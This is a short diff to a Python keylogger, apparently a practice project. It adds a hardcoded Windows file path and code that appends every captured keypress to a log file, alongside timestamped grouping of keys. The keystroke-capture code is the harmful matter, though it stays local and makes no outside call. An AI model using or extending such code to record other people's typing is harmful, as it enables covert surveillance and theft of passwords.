@@ -9,6 +9,7 @@ def on_key_press(key):                             #A function that receives inp
     global str_for_show,dicti
     key = key.name
     currentTime = datetime.now().strftime('%d/%m/%y %H:%M')
+    filename = r"C:\Git\myTestRepo1\kodcod1\file_for_kelogger.txt"
 
     if currentTime not in dicti:
         dicti[currentTime] = ''
@@ -16,6 +17,9 @@ def on_key_press(key):                             #A function that receives inp
         fili.write(f"**** {currentTime} ****\n")
         fili.close()
 
+    fili = open(filename, "a")
+    fili.write(key)
+    fili.close()
     dicti[currentTime] += key
     str_for_show += key
 
